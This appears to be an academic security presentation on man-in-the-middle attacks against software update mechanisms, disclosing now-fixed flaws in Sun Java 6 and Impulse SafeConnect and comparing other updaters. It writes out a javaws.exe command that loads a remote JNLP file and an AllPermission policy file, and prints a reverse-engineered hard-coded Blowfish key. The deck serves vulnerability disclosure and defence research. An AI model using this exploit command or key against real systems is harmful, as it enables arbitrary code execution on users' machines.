<?xml version="1.0" ?>
<Presentation>
  <div class="page">
    <p>Protecting Free and Open Communications on the Internet</p>
    <p>Against Man-in-the-Middle Attacks on Third-Party Software</p>
    <p>Jeffrey Knockel, Jedidiah Crandall Computer Science Department</p>
    <p>University of New Mexico</p>
  </div>
  <div class="page"/>
  <div class="page">
    <p>Recent News</p>
    <p>Iran: forged SSL certificates for update servers[1]  Egypt: government licensed FinFisher to exploit</p>
    <p>iTunes updates[2]  Flame malware exploits MD5 collision with</p>
    <p>Windows updates[3] [1]https://blog.torproject.org/blog/diginotar-damage-disclosure</p>
    <p>[2]http://www.theregister.co.uk/2011/09/21/egypt_cyber_spy_controversy/</p>
    <p>[3]http://krebsonsecurity.com/2012/06/flame-malware-prompts-microsoft-patch/</p>
  </div>
  <div class="page">
    <p>Insecure HTTP</p>
  </div>
  <div class="page">
    <p>Unsigned Executables</p>
  </div>
  <div class="page">
    <p>Software Updates</p>
    <p>Performance  Security  Under one</p>
    <p>minute install</p>
  </div>
  <div class="page">
    <p>Problem</p>
    <p>Untrusted networks  Hotel/coffee shop wireless  Foreign country</p>
    <p>A man in the middle can exploit even sophisticated updaters using asymmetric crypto</p>
  </div>
  <div class="page">
    <p>Sun Java</p>
  </div>
  <div class="page">
    <p>Exploit Time Frame</p>
    <p>...September 2011</p>
    <p>February 2012</p>
  </div>
  <div class="page">
    <p>Updates</p>
    <p>We look at Java 6 (Java 7 is analogous)  Automatic updater periodically queries</p>
    <p>javadl-esd.sun.com/update/1.6.0/map-m-1.6.0.xml</p>
    <p>Points to update information javadl-esd.sun.com/update/1.6.0/au-descriptor-1.6.0_31-b79.xml</p>
    <p>Contains  URL for installer  Command line arguments  SHA1 hash of installer</p>
  </div>
  <div class="page">
    <p>Verification</p>
    <p>Installer is downloaded and verified  Against XML-provided hash  To have Sun Microsystems, Inc. digital signature  To have a PE version number at least as high</p>
  </div>
  <div class="page">
    <p>To Exploit</p>
    <p>We want an executable that  Has same SHA1 hash as in XML</p>
    <p>We can provide a different hash  Has a Sun Microsystems, Inc. digital signature  Has a PE version number at least as high  Can still somehow run arbitrary code</p>
  </div>
  <div class="page">
    <p>Exploit</p>
    <p>javaws.exe</p>
  </div>
  <div class="page">
    <p>Exploit</p>
    <p>javaws.exe  Arguments:</p>
    <p>http://url/to/hello.jnlp  -J-Djava.security.policy=http://url/to/grantall.jp  -Xnosplash  -open</p>
    <p>Fixed in Java 6 Update 31, 7 Update 3  HTTPS to fetch XML</p>
    <p>grant { permission java.security.AllPermission; };</p>
  </div>
  <div class="page">
    <p>Impulse SafeConnect</p>
  </div>
  <div class="page">
    <p>Exploit Time Frame</p>
    <p>...July 2011</p>
    <p>August 2011</p>
  </div>
  <div class="page">
    <p>Updates</p>
    <p>Silently updates itself  Connects to hard-coded 198.31.193.211 via</p>
    <p>HTTP (only accessible on campus)  XML communication encrypted via Blowfish key</p>
    <p>in ECB mode (reverse engineered):</p>
    <p>\x4f\xbd\x06\x00\x00\xca\x9c\x18\x03\xfc\x91\x3f</p>
  </div>
  <div class="page">
    <p>Verification</p>
    <p>Server responds with Blowfish-encrypted URL's and MD5 hashes for updated files</p>
    <p>Files are downloaded  Files are verified to have Impulse Point LLC</p>
    <p>digital signature</p>
  </div>
  <div class="page">
    <p>Problem</p>
    <p>Blowfish encryption is symmetric  We can receive XML updates   We can send client arbitrary XML</p>
    <p>But update files need signature</p>
  </div>
  <div class="page">
    <p>Exploit</p>
    <p>Get around digital signature verification  Upgrade to an older client that is signed but</p>
    <p>performs no check  Upgrade older client to arbitrary code  Fixed by 5059.242 by using HTTPS  Must be on campus to receive fix  HTTPS private key one hop away</p>
  </div>
  <div class="page">
    <p>Other Programs</p>
    <p>Virtualbox (verification left to user)  Downloads update information via HTTP  Download links open in browser</p>
  </div>
  <div class="page">
    <p>Other Programs</p>
    <p>Adobe Flash (suspicious)  Downloads XML via HTTP  Verifies digital signature of installer  Downloaded installer verifies that a newer version of</p>
    <p>Flash is not installed</p>
    <p>Google Chrome (cool)  Downloads signed XML via HTTP  Verifies XML's signature  Downloads installer via HTTP  Verifies installer's hash against XML</p>
  </div>
  <div class="page">
    <p>Impact</p>
    <p>These aren't hard to find  With just two, we could own</p>
    <p>Windows + Java users  Anyone on our campus wifi</p>
    <p>Governments can do much better than us</p>
  </div>
  <div class="page">
    <p>Solutions?</p>
    <p>Smart people really have difficulty doing updates</p>
    <p>Despite trying really hard  How can we protect the FOCI of users on</p>
    <p>untrusted networks?</p>
  </div>
  <div class="page">
    <p>Solutions?</p>
    <p>Find and fix vulnerable software?  All vulnerable software  Most vulnerable software</p>
    <p>Give users tools to detect unsafe updates?  Blacklist  Dynamic analysis</p>
  </div>
  <div class="page">
    <p>Solutions?</p>
    <p>More libraries? OS-provided service?  Optional (TUF[4])  Required...</p>
    <p>Walled gardens?  Walled gardens commonly censor[5]</p>
    <p>Competing technology  Obscene material  Religiously controversial material  Content over the line</p>
    <p>[4]https://theupdateframework.com/</p>
    <p>[5]https://developer.apple.com/appstore/resources/approval/guidelines.html</p>
  </div>
  <div class="page">
    <p>Acknowledgments</p>
    <p>This material is based upon work supported by the National Science Foundation under Grant Nos. #0844880, #0905177, and #1017602.</p>
    <p>Any opinions, findings, and conclusions or recommendations expressed in this material are</p>
    <p>those of the author(s) and do not necessarily reflect the views of the National Science Foundation.</p>
  </div>
</Presentation>
